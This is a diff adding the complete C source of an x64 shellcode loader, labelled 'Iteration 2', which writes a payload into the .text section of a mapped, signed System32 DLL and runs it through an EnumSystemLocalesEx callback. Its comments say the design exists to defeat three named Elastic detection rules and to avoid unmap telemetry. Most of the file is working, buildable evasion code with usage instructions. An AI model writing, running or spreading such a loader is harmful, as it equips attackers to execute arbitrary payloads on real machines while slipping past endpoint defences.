@@ -1,0 +1,401 @@
+/*
+ * x64 shellcode loader - Iteration 2
+ *
+ * Technique: threadless_injection (EnumSystemLocalesEx callback)
+ *            composed with module_stomping_section_mapping
+ *            (NtCreateSection(SEC_IMAGE) + NtMapViewOfSection of a
+ *             signed System32 DLL; payload written into its .text).
+ *
+ * Why: all three Elastic rules from Iter 1 depend on
+ *      process.parent.thread.Ext.call_stack_contains_unbacked == true.
+ *      Executing from a private VirtualAlloc page makes that flag true.
+ *      Executing from an image-backed mapped section makes it false.
+ *
+ * Build (MSVC x64):
+ *   cl /nologo /O2 /GS- loader_threadless_injection_2.c
+ *
+ * Usage:
+ *   loader_threadless_injection_2.exe C:\path\to\calc.bin
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+
+/* ------------------------------------------------------------------ */
+/* Minimal NT API declarations (winternl.h does not define these)      */
+/* ------------------------------------------------------------------ */
+
+typedef LONG NTSTATUS;
+#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#endif
+
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
+
+/* NTSTATUS NtCreateSection(...) */
+typedef NTSTATUS (NTAPI *pNtCreateSection)(
+    PHANDLE            SectionHandle,
+    ACCESS_MASK        DesiredAccess,
+    PVOID              ObjectAttributes,   /* POBJECT_ATTRIBUTES */
+    PLARGE_INTEGER     MaximumSize,
+    ULONG              SectionPageProtection,
+    ULONG              AllocationAttributes,
+    HANDLE             FileHandle
+);
+
+/* NTSTATUS NtMapViewOfSection(...) */
+typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
+    HANDLE          SectionHandle,
+    HANDLE          ProcessHandle,
+    PVOID          *BaseAddress,
+    ULONG_PTR       ZeroBits,
+    SIZE_T          CommitSize,
+    PLARGE_INTEGER  SectionOffset,
+    PSIZE_T         ViewSize,
+    SECTION_INHERIT InheritDisposition,
+    ULONG           AllocationType,
+    ULONG           Win32Protect
+);
+
+/* NTSTATUS NtClose(HANDLE) */
+typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);
+
+/* ------------------------------------------------------------------ */
+/* Callback prototype for EnumSystemLocalesEx                          */
+/* ------------------------------------------------------------------ */
+typedef BOOL (CALLBACK *LOCALE_ENUMPROCEX)(LPWSTR, DWORD, LPARAM);
+
+/* ------------------------------------------------------------------ */
+/* One-shot guard: shellcode is executed only on the first callback.   */
+/* ------------------------------------------------------------------ */
+static volatile LONG g_done = 0;
+
+/*
+ * We pass the payload address via lParam so the callback can be a
+ * normal function (not the payload itself). This is safer than
+ * pointing the callback directly at the payload because:
+ *   - the payload's return value is undefined;
+ *   - EnumSystemLocalesEx may invoke the callback more than once.
+ *
+ * The callback calls into the payload via a function pointer with the
+ * x64 Windows ABI. The payload sees a normal call frame; the OS has
+ * already ensured 16-byte stack alignment at the callback entry.
+ */
+typedef void (*PAYLOAD_FN)(void);
+
+static BOOL CALLBACK locale_enum_proc(LPWSTR lpLocaleString, DWORD dwFlags, LPARAM lParam)
+{
+    PAYLOAD_FN fn;
+
+    (void)lpLocaleString;
+    (void)dwFlags;
+
+    /* Atomic one-shot: only the first invocation runs the payload. */
+    if (InterlockedCompareExchange(&g_done, 1, 0) != 0) {
+        return FALSE;   /* stop enumeration */
+    }
+
+    fn = (PAYLOAD_FN)lParam;
+    if (fn != NULL) {
+        fn();
+    }
+
+    /* If the payload returned, stop enumerating further locales. */
+    return FALSE;
+}
+
+/* ------------------------------------------------------------------ */
+/* Read the whole file into a heap buffer. Caller frees.               */
+/* ------------------------------------------------------------------ */
+static unsigned char *read_file(const char *path, size_t *out_size)
+{
+    FILE *fp = NULL;
+    long  sz = 0;
+    unsigned char *buf = NULL;
+    size_t got = 0;
+
+    if (path == NULL || out_size == NULL) {
+        return NULL;
+    }
+
+    fp = fopen(path, "rb");
+    if (fp == NULL) {
+        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", path, errno);
+        fflush(stderr);
+        return NULL;
+    }
+
+    if (fseek(fp, 0, SEEK_END) != 0) {
+        fclose(fp);
+        return NULL;
+    }
+    sz = ftell(fp);
+    if (sz <= 0) {
+        fclose(fp);
+        fprintf(stderr, "[-] empty or unreadable file\n");
+        fflush(stderr);
+        return NULL;
+    }
+    if (fseek(fp, 0, SEEK_SET) != 0) {
+        fclose(fp);
+        return NULL;
+    }
+
+    buf = (unsigned char *)malloc((size_t)sz);
+    if (buf == NULL) {
+        fclose(fp);
+        return NULL;
+    }
+
+    got = fread(buf, 1, (size_t)sz, fp);
+    fclose(fp);
+
+    if (got != (size_t)sz) {
+        fprintf(stderr, "[-] short read (%zu of %ld)\n", got, sz);
+        fflush(stderr);
+        free(buf);
+        return NULL;
+    }
+
+    *out_size = (size_t)sz;
+    return buf;
+}
+
+/* ------------------------------------------------------------------ */
+/* Locate the executable section of an image-mapped view.              */
+/* Returns pointer + size of the first section with IMAGE_SCN_MEM_EXECUTE. */
+/* ------------------------------------------------------------------ */
+static unsigned char *find_exec_section(unsigned char *base, SIZE_T *out_size)
+{
+    PIMAGE_DOS_HEADER      dos;
+    PIMAGE_NT_HEADERS      nt;
+    PIMAGE_SECTION_HEADER  sec;
+    WORD                   i;
+
+    if (base == NULL || out_size == NULL) {
+        return NULL;
+    }
+
+    dos = (PIMAGE_DOS_HEADER)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+        return NULL;
+    }
+
+    nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) {
+        return NULL;
+    }
+
+    sec = IMAGE_FIRST_SECTION(nt);
+    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            *out_size = (SIZE_T)sec[i].Misc.VirtualSize;
+            if (*out_size == 0) {
+                *out_size = (SIZE_T)sec[i].SizeOfRawData;
+            }
+            return base + sec[i].VirtualAddress;
+        }
+    }
+    return NULL;
+}
+
+/* ------------------------------------------------------------------ */
+int main(int argc, char *argv[])
+{
+    unsigned char *sc = NULL;
+    size_t         sc_size = 0;
+
+    HMODULE        ntdll = NULL;
+    pNtCreateSection   NtCreateSection   = NULL;
+    pNtMapViewOfSection NtMapViewOfSection = NULL;
+    pNtClose           NtClose           = NULL;
+
+    HANDLE         hFile = INVALID_HANDLE_VALUE;
+    HANDLE         hSection = NULL;
+    PVOID          view = NULL;
+    SIZE_T         viewSize = 0;
+    NTSTATUS       st;
+
+    unsigned char *exec = NULL;
+    SIZE_T         exec_size = 0;
+    DWORD          old_prot = 0;
+    SIZE_T         i;
+    const char    *host_dll = "C:\\Windows\\System32\\amstream.dll";
+
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
+        fflush(stderr);
+        return 1;
+    }
+
+    /* ---- 1. Load payload bytes from disk ---- */
+    sc = read_file(argv[1], &sc_size);
+    if (sc == NULL) {
+        return 1;
+    }
+    printf("[+] loaded %zu bytes from %s\n", sc_size, argv[1]);
+    fflush(stdout);
+
+    /* ---- 2. Resolve NT APIs from ntdll ---- */
+    ntdll = GetModuleHandleA("ntdll.dll");
+    if (ntdll == NULL) {
+        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed: %lu\n", GetLastError());
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    NtCreateSection    = (pNtCreateSection)   GetProcAddress(ntdll, "NtCreateSection");
+    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
+    NtClose            = (pNtClose)           GetProcAddress(ntdll, "NtClose");
+
+    if (NtCreateSection == NULL || NtMapViewOfSection == NULL || NtClose == NULL) {
+        fprintf(stderr, "[-] failed to resolve NT APIs\n");
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    /* ---- 3. Open the sacrificial signed DLL (read access only) ---- */
+    hFile = CreateFileA(
+        host_dll,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        fprintf(stderr, "[-] CreateFileA(%s) failed: %lu\n", host_dll, GetLastError());
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    /* ---- 4. Create an image section from the DLL ---- */
+    st = NtCreateSection(
+        &hSection,
+        SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
+        NULL,                       /* ObjectAttributes */
+        NULL,                       /* MaximumSize */
+        PAGE_EXECUTE_READ,          /* SectionPageProtection */
+        SEC_IMAGE,                  /* AllocationAttributes */
+        hFile);
+
+    if (!NT_SUCCESS(st) || hSection == NULL) {
+        fprintf(stderr, "[-] NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n",
+                (unsigned long)st);
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    /* ---- 5. Map a view of the image section into our process ---- */
+    viewSize = 0;
+    st = NtMapViewOfSection(
+        hSection,
+        GetCurrentProcess(),
+        &view,
+        0,                          /* ZeroBits */
+        0,                          /* CommitSize */
+        NULL,                       /* SectionOffset */
+        &viewSize,
+        ViewShare,
+        0,
+        PAGE_EXECUTE_READ);         /* Win32Protect */
+
+    if (!NT_SUCCESS(st) || view == NULL) {
+        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n",
+                (unsigned long)st);
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    printf("[+] mapped image view at %p (size %zu) from %s\n",
+           view, (size_t)viewSize, host_dll);
+    fflush(stdout);
+
+    /* ---- 6. Locate the executable section ---- */
+    exec = find_exec_section((unsigned char *)view, &exec_size);
+    if (exec == NULL || exec_size == 0) {
+        fprintf(stderr, "[-] no executable section found in mapped image\n");
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    if (sc_size > exec_size) {
+        fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
+                sc_size, (size_t)exec_size);
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    printf("[+] .text at %p (size %zu)\n", exec, (size_t)exec_size);
+    fflush(stdout);
+
+    /* ---- 7. Make the .text region writable, copy payload in ---- */
+    if (!VirtualProtect(exec, exec_size, PAGE_READWRITE, &old_prot)) {
+        fprintf(stderr, "[-] VirtualProtect(RW on .text) failed: %lu\n",
+                GetLastError());
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    for (i = 0; i < sc_size; ++i) {
+        exec[i] = sc[i];
+    }
+
+    /* Zero the on-heap copy of the payload as hygiene. */
+    SecureZeroMemory(sc, sc_size);
+
+    /* ---- 8. Restore .text to PAGE_EXECUTE_READ (image-backed RX) ---- */
+    if (!VirtualProtect(exec, exec_size, PAGE_EXECUTE_READ, &old_prot)) {
+        fprintf(stderr, "[-] VirtualProtect(RX on .text) failed: %lu\n",
+                GetLastError());
+        fflush(stderr);
+        goto cleanup;
+    }
+
+    printf("[+] payload written into image-backed .text at %p\n", exec);
+    fflush(stdout);
+
+    /* ---- 9. Threadless dispatch via EnumSystemLocalesEx ---- */
+    printf("[+] dispatching payload via EnumSystemLocalesEx (threadless)\n");
+    fflush(stdout);
+
+    /*
+     * Use LOCALE_WINDOWS (a small, well-defined set) rather than
+     * LOCALE_ALL. The callback is guarded by an atomic one-shot flag,
+     * so the payload executes exactly once even if the API invokes the
+     * callback multiple times to enumerate locales.
+     */
+    EnumSystemLocalesEx(locale_enum_proc, LOCALE_WINDOWS, (LPARAM)exec, NULL);
+
+    printf("[+] payload returned; cleaning up\n");
+    fflush(stdout);
+
+cleanup:
+    if (sc != NULL) {
+        SecureZeroMemory(sc, sc_size);
+        free(sc);
+        sc = NULL;
+    }
+    if (hFile != INVALID_HANDLE_VALUE) {
+        CloseHandle(hFile);
+        hFile = INVALID_HANDLE_VALUE;
+    }
+    if (hSection != NULL) {
+        NtClose(hSection);
+        hSection = NULL;
+    }
+    /*
+     * Deliberately do NOT unmap the view: the stomped image remains
+     * mapped in our process, which matches the appearance of a normally
+     * loaded module and avoids any unmap telemetry.
+     */
+    return 0;
+}
